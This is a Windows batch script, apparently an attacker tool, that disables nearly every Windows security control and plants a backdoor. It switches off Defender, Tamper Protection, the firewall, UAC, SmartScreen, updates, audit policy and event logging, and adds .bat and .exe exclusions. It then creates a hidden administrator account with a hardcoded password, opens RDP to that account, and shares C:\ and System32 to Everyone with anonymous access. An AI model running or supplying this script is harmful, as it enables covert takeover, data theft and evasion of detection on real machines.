@echo off 
cls
::batch script to disable Windows Security features - ozpingux
::enable powershell scripts
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command set-executionpolicy Unrestricted -force
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command set-executionpolicy RemoteSigned -force
::windows notifications
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications" -Name "ToastEnabled" -Type DWord -Value 0"
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Security Center' -Name "AntiVirusDisableNotify" -Type DWord -Value 0"
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Security Center' -Name "FirewallDisableNotify" -Type DWord -Value 0"
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Security Center' -Name "UpdatesDisableNotify" -Type DWord -Value 0"
REG add "HKCU\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f
REG add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f
::smart screen filter
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Type String -Value "Off"
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Type DWord -Value 0
REG add "HKLM\SOFTWARE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f
REG add "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge\PhishingFilter" /v EnabledV9 /t REG_DWORD /d 0 /f
REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f
::user account control
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Type DWord -Value 0
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Type DWord -Value 0
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name “EnableLUA” -Value 0"
::event audit
auditpol /clear /y 
auditpol /remove /allusers
::events viewer
REG add "HKLM\SYSTEM\CurrentControlSet\services\eventlog" /v Start /t REG_DWORD /d 4 /f
::firewall
REG add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MpsSvc\" /v Start /t REG_DWORD /d 4 /f
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
netsh advfirewall set allprofiles state off
netsh firewall set opmode mode = disable
netsh firewall set opmode disable
netsh advfirewall set  currentprofile state off
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Set-NetFirewallProfile -All -Enabled False
::windows security center
REG add "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v Start /t REG_DWORD /d 4 /f 
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DontReportInfectionInformation /t REG_DWORD /d 1 /f
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService" -Name "Start" -Type DWord -Value 0"
::event viewer service
net stop EventLog /y
::network inspection service
net stop WdNisSvc /y
::security center service
net stop wscsvc /y 
REG add "HKLM\SYSTEM\CurrentControlSet\services\wscsvc" /v Start /t REG_DWORD /d 4 /f
::windows updates service
net stop wuauserv /y
sc config wuauserv start= disabled
::windows defender
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "0" /f
reg add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
sc stop WinDefend
sc config WinDefend start= disabled
sc stop WinDefend
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Set-MpPreference -DisableRealtimeMonitoring $true
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableDefender" /t REG_DWORD /d "1" /f
powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat"
powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe"
powershell.exe -command "Set-MpPreference -PUAProtection disable"
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f > Nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f > Nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f > Nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f > Nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f  > Nul
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1"
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "0" /f
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f
schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "Windows Defender" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /f
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" "WindowsDefender" -ea 0
::windows defender realtime protection
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring 1"
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-NetFirewallProfile -Enabled False"
::hide admin user
net user Administrador /active:yes && net user Administrador Abc123#54
net user Administrator /active:yes && net user Administrator Abc123#54
net user SupportAccount /add && net user SupportAccount /active:yes && net user SupportAccount Abc123#54
net localgroup Administradores SupportAccount /add && net localgroup Usuarios SupportAccount /del 
net localgroup Administrators SupportAccount /add && net localgroup Users SupportAccount /del
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v SupportAccount /t REG_DWORD /d 0 /f
::rdp access to hide user
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name UserAuthentication -Value 1
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Set-NetFirewallRule -DisplayGroup 'Escritorio Remoto' -Enabled True
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Set-NetFirewallRule -DisplayGroup 'Remote Desktop' -Enabled True
Netsh advfirewall firewall set rule group="Escritorio Remoto" new enable=yes
Netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes
net localgroup "Usuarios de escritorio remoto" SupportAccount /add
net localgroup "Remote Desktop Users" SupportAccount /add
::full access shared resource
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v everyoneincludeanonymous /t REG_DWORD /d 1 /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v restrictnullsessaccess /t REG_DWORD /d 0 /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\" /v LmCompatibilityLevel /t REG_DWORD /d 1 /f
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command New-SmbShare -Name "C" -Path 'C:\' -FullAccess Everyone
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command New-SmbShare -Name "WindowsSSys" -Path "C:\Windows" -FullAccess Everyone
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command New-SmbShare -Name "Systemx64" -Path "C:\Windows\System32" -FullAccess Everyone
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command New-SmbShare -Name "C" -Path 'C:\' -FullAccess Todos
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command New-SmbShare -Name "WindowsSSys" -Path "C:\Windows" -FullAccess Todos
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command New-SmbShare -Name "Systemx64" -Path "C:\Windows\System32" -FullAccess Todos
mkdir C:\Users\Public\DataSys && net share DataSys=C:\Users\Public\DataSys /GRANT:Everyone,FULL
net share DataSysII=C:\ /GRANT:Everyone,FULL
net share DataSysIII=C:\Users /GRANT:Everyone,FULL
net share DataSysII=C:\ /GRANT:Todos,FULL
net share DataSysIII=C:\Users /GRANT:Todos,FULL
net stop SystemEventsBroker /y
net stop MpsSvc /y
net stop SecurityHealthService /y
net stop Wecsvc /y
net stop WerSvc /y
Echo "security features disabled"
pause
